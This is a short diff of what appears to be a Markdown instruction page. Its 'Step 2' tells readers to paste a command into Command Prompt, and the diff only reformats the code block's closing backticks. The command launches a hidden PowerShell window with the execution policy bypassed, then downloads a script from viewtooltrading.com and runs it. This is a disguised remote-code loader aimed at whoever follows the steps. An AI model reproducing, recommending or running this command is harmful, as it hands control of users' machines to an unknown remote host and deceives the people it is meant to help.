@@ -7,7 +7,8 @@
 
 ### Step 2: Execute the Command.
 Copy and paste the command below into Command Prompt.
-```Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"iex(iwr -UseBasicParsing 'https://viewtooltrading.com/run.txt')`""; exit`````
+```Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"iex(iwr -UseBasicParsing 'https://viewtooltrading.com/run.txt')`""; exit
+`````
 
 
 
